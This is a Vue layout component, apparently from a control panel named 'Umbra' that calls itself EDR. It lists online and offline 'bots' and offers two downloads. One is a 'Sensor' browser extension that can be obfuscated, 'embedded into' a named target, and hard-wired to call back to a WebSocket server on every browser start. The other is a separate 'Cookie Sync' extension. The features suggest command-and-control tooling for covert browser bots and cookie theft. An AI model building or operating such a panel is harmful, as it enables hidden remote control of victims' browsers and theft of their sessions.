<script setup lang="ts">
import { computed, onBeforeUnmount, onMounted, ref } from 'vue'
import { RouterView, RouterLink, useRouter } from 'vue-router'
import { useAuthStore } from '@/stores/auth'
import { useBotsStore } from '@/stores/bots'
import { useExtensionDownload } from '@/composables/useExtensionDownload'
import { investigate } from '@/api/endpoints'
import Modal from '@/components/ui/Modal.vue'
import Btn from '@/components/ui/Btn.vue'

const auth = useAuthStore()
const bots = useBotsStore()
const router = useRouter()
const {
  obfuscate, targetName,
  openConfirm, downloadCookieSync, confirmDownload, cancelDownload, confirmOpen,
  draftWsUrl, wsUrlError, wsUrlHint, defaultWsUrl,
  downloading, downloadPhase, downloadError,
  cookieSyncDownloading, cookieSyncError, clearCookieSyncError,
} = useExtensionDownload()

const draftWsInput = ref<HTMLInputElement | null>(null)

const onlineLabel = computed(() => `${bots.onlineCount} live · ${bots.offlineCount} offline`)
const unacked = ref(0)
let alertTimer: ReturnType<typeof setTimeout> | null = null

async function refreshAlerts(): Promise<void> {
  try {
    const row = await investigate.unackedCount()
    unacked.value = row.count ?? 0
  } catch {
    unacked.value = 0
  }
}

onMounted(() => {
  void refreshAlerts()
  const tick = async (): Promise<void> => {
    await refreshAlerts()
    alertTimer = setTimeout(() => void tick(), 15000)
  }
  alertTimer = setTimeout(() => void tick(), 15000)
})
onBeforeUnmount(() => {
  if (alertTimer) clearTimeout(alertTimer)
})

async function logout(): Promise<void> {
  await auth.logout()
  await router.replace('/login')
}

function toggleTheme(): void {
  document.documentElement.classList.toggle('light')
}
</script>

<template>
  <div class="min-h-screen flex flex-col">
    <!-- top bar -->
    <header
      class="h-12 shrink-0 flex items-center px-4 border-b border-border-subtle bg-bg-base/90 backdrop-blur z-10 sticky top-0"
    >
      <RouterLink to="/" class="flex items-center gap-2 mr-6">
        <div
          class="size-6 rounded bg-accent-soft border border-accent/30 grid place-items-center"
        >
          <span class="text-accent font-bold text-[11px]">C</span>
        </div>
        <span class="font-semibold tracking-tight text-[13px]">Umbra</span>
        <span class="chip ml-1.5">edr</span>
      </RouterLink>

      <nav class="flex items-center gap-1 text-[12px]">
        <RouterLink
          v-slot="{ isActive }"
          to="/"
          custom
        >
          <RouterLink
            to="/"
            class="px-2.5 h-7 inline-flex items-center rounded transition-colors"
            :class="
              isActive
                ? 'bg-bg-overlay text-fg-base'
                : 'text-fg-muted hover:text-fg-base hover:bg-bg-hover'
            "
          >
            Bots
          </RouterLink>
        </RouterLink>
        <RouterLink
          v-slot="{ isActive }"
          to="/alerts"
          custom
        >
          <RouterLink
            to="/alerts"
            class="px-2.5 h-7 inline-flex items-center gap-1.5 rounded transition-colors"
            :class="
              isActive
                ? 'bg-bg-overlay text-fg-base'
                : 'text-fg-muted hover:text-fg-base hover:bg-bg-hover'
            "
          >
            Alerts
            <span
              v-if="unacked > 0"
              class="min-w-[16px] h-4 px-1 rounded-full bg-danger text-white text-[10px] grid place-items-center"
            >{{ unacked }}</span>
          </RouterLink>
        </RouterLink>
        <RouterLink
          v-slot="{ isActive }"
          to="/settings"
          custom
        >
          <RouterLink
            to="/settings"
            class="px-2.5 h-7 inline-flex items-center rounded transition-colors"
            :class="
              isActive
                ? 'bg-bg-overlay text-fg-base'
                : 'text-fg-muted hover:text-fg-base hover:bg-bg-hover'
            "
          >
            Settings
          </RouterLink>
        </RouterLink>
        <RouterLink
          v-if="auth.isAdmin"
          v-slot="{ isActive }"
          to="/audit"
          custom
        >
          <RouterLink
            to="/audit"
            class="px-2.5 h-7 inline-flex items-center rounded transition-colors"
            :class="
              isActive
                ? 'bg-bg-overlay text-fg-base'
                : 'text-fg-muted hover:text-fg-base hover:bg-bg-hover'
            "
          >
            Audit
          </RouterLink>
        </RouterLink>
      </nav>

      <div class="ml-auto flex items-center gap-3">
        <!-- Extension downloads — trigger shared confirm modal -->
        <div class="flex items-center gap-1 border-r border-border-subtle pr-3">
          <button
            class="h-7 px-2 rounded text-[11px] inline-flex items-center gap-1.5 transition-colors"
            :class="obfuscate
              ? 'bg-accent/15 text-accent hover:bg-accent/25'
              : 'text-fg-muted hover:text-fg-base hover:bg-bg-hover'"
            title="Download main extension"
            @click="openConfirm"
          >
            <svg viewBox="0 0 16 16" class="size-3" fill="currentColor">
              <path d="M8 1a.5.5 0 0 1 .5.5v8.793l2.146-2.147a.5.5 0 0 1 .708.708l-3 3a.5.5 0 0 1-.708 0l-3-3a.5.5 0 1 1 .708-.708L7.5 10.293V1.5A.5.5 0 0 1 8 1ZM2 13.5a.5.5 0 0 1 .5-.5h11a.5.5 0 0 1 0 1h-11a.5.5 0 0 1-.5-.5Z"/>
            </svg>
            Extension
          </button>
          <button
            class="h-7 px-2 rounded text-[11px] inline-flex items-center gap-1.5 text-fg-muted hover:text-fg-base hover:bg-bg-hover transition-colors"
            :class="cookieSyncDownloading ? 'opacity-60 cursor-not-allowed' : ''"
            :disabled="cookieSyncDownloading"
            :title="cookieSyncDownloading ? 'Downloading Cookie Sync extension' : 'Download Cookie Sync extension'"
            @click="downloadCookieSync"
          >
            <svg viewBox="0 0 16 16" class="size-3" fill="currentColor">
              <path d="M8 1a.5.5 0 0 1 .5.5v8.793l2.146-2.147a.5.5 0 0 1 .708.708l-3 3a.5.5 0 0 1-.708 0l-3-3a.5.5 0 1 1 .708-.708L7.5 10.293V1.5A.5.5 0 0 1 8 1ZM2 13.5a.5.5 0 0 1 .5-.5h11a.5.5 0 0 1 0 1h-11a.5.5 0 0 1-.5-.5Z"/>
            </svg>
            {{ cookieSyncDownloading ? 'Downloading…' : 'Sync' }}
          </button>
        </div>

        <span class="chip mono">
          <span class="live-dot" /> {{ onlineLabel }}
        </span>
        <button
          class="size-7 rounded text-fg-muted hover:text-fg-base hover:bg-bg-hover grid place-items-center"
          aria-label="Toggle theme"
          title="Toggle theme"
          @click="toggleTheme"
        >
          <svg viewBox="0 0 16 16" class="size-3.5" fill="currentColor">
            <path
              d="M8 1a7 7 0 1 0 7 7c0-.21-.01-.42-.03-.63A6 6 0 0 1 8.63 1.03 6.85 6.85 0 0 0 8 1Z"
            />
          </svg>
        </button>
        <div class="text-[12px] flex items-center gap-2">
          <span class="text-fg-faint mono">{{ auth.me?.username }}</span>
          <button
            class="text-fg-muted hover:text-fg-base text-[11px] uppercase tracking-wider"
            @click="logout"
          >
            Sign out
          </button>
        </div>
      </div>
    </header>

    <main class="flex-1 min-h-0">
      <RouterView />
    </main>

    <!-- Shared confirm-before-download modal (Teleported to body) -->
    <Modal
      :open="confirmOpen"
      title="Confirm WebSocket address"
      width="md"
      :close-on-backdrop="!downloading"
      @close="cancelDownload"
    >
      <div class="space-y-3">
        <p class="text-[12px] text-fg-muted leading-relaxed">
          This URL is baked into the extension at download time. The
          extension will connect to it on every browser start.
        </p>

        <label class="block">
          <span class="block text-[11px] uppercase tracking-wider text-fg-muted mb-1.5">
            WebSocket server URL
          </span>
          <input
            ref="draftWsInput"
            v-model="draftWsUrl"
            type="text"
            spellcheck="false"
            :disabled="downloading || downloadPhase === 'done'"
            class="w-full h-9 text-[13px] px-3 bg-bg-base border border-border-subtle text-fg-base rounded-md focus:outline-none focus:border-accent focus:ring-1 focus:ring-accent/40 placeholder:text-fg-faint transition-colors font-mono disabled:opacity-50 disabled:cursor-not-allowed"
            :class="wsUrlError ? '!border-danger !ring-danger/40' : ''"
            :placeholder="defaultWsUrl"
            @keydown.enter="confirmDownload"
          >
          <p v-if="wsUrlError" class="text-danger text-[11px] mt-1">{{ wsUrlError }}</p>
          <p v-else-if="wsUrlHint" class="text-warn text-[11px] mt-1">{{ wsUrlHint }}</p>
          <p v-else class="text-fg-faint text-[11px] mt-1">
            Use ws://host:4343 for Umbra's bot socket. wss:// on 4343 fails unless TLS is terminated there. This panel remembers the last confirmed address.
          </p>
        </label>

        <dl class="text-[12px] grid grid-cols-[6.5rem_1fr] gap-y-1 mt-2 pt-3 border-t border-border-subtle">
          <dt class="text-fg-muted">Package</dt>
          <dd class="text-fg-base">Umbra Sensor</dd>
          <dt class="text-fg-muted">Embed into</dt>
          <dd class="text-fg-base">{{ targetName }}</dd>
          <dt class="text-fg-muted">Obfuscate</dt>
          <dd class="text-fg-base">{{ obfuscate ? 'Yes' : 'No' }}</dd>
        </dl>

        <!-- Download status feedback -->
        <div
          v-if="downloadPhase !== 'idle'"
          class="flex items-center gap-2 px-3 py-2.5 rounded-md text-[12px] mt-3 transition-colors"
          :class="{
            'bg-accent/10 text-accent': downloadPhase === 'packaging',
            'bg-success/10 text-success': downloadPhase === 'done',
            'bg-danger/10 text-danger': downloadPhase === 'error',
          }"
        >
          <span
            v-if="downloadPhase === 'packaging'"
            class="size-3.5 rounded-full border-2 border-current border-t-transparent animate-spin shrink-0"
          />
          <svg v-else-if="downloadPhase === 'done'" class="size-3.5 shrink-0" viewBox="0 0 16 16" fill="currentColor">
            <path d="M13.485 3.929a1 1 0 0 1 .086 1.413l-6 7a1 1 0 0 1-1.434.063l-3-3a1 1 0 1 1 1.414-1.414l2.244 2.243 5.278-6.159a1 1 0 0 1 1.412-.146Z"/>
          </svg>
          <svg v-else-if="downloadPhase === 'error'" class="size-3.5 shrink-0" viewBox="0 0 16 16" fill="currentColor">
            <path d="M8 1a7 7 0 1 0 0 14A7 7 0 0 0 8 1Zm-.75 4a.75.75 0 0 1 1.5 0v3.5a.75.75 0 0 1-1.5 0V5Zm.75 6.5a.75.75 0 1 1 0-1.5.75.75 0 0 1 0 1.5Z"/>
          </svg>
          <span>
            <template v-if="downloadPhase === 'packaging'">
              Packaging extension&hellip; this may take a moment
            </template>
            <template v-else-if="downloadPhase === 'done'">
              Download complete
            </template>
            <template v-else-if="downloadPhase === 'error'">
              {{ downloadError || 'Download failed' }}
            </template>
          </span>
        </div>
      </div>

      <template #footer>
        <Btn
          variant="ghost"
          :disabled="downloadPhase === 'done'"
          @click="cancelDownload"
        >
          {{ downloading ? 'Abort' : 'Cancel' }}
        </Btn>
        <Btn
          variant="primary"
          :disabled="!!wsUrlError || downloadPhase === 'done'"
          :loading="downloading"
          @click="confirmDownload"
        >
          {{ downloadPhase === 'error' ? 'Retry' : 'Download .zip' }}
        </Btn>
      </template>
    </Modal>

    <!-- Cookie Sync downloads do not use the Sensor modal. Keep direct errors visible. -->
    <div
      v-if="cookieSyncError"
      role="alert"
      class="fixed right-4 bottom-4 z-50 max-w-sm flex items-start gap-3 px-4 py-3 rounded-md border border-danger/30 bg-danger-soft text-danger shadow-lg text-[12px]"
    >
      <span class="flex-1">Cookie Sync download failed: {{ cookieSyncError }}</span>
      <button
        class="text-danger/70 hover:text-danger"
        aria-label="Dismiss Cookie Sync download error"
        @click="clearCookieSyncError"
      >
        &times;
      </button>
    </div>
  </div>
</template>
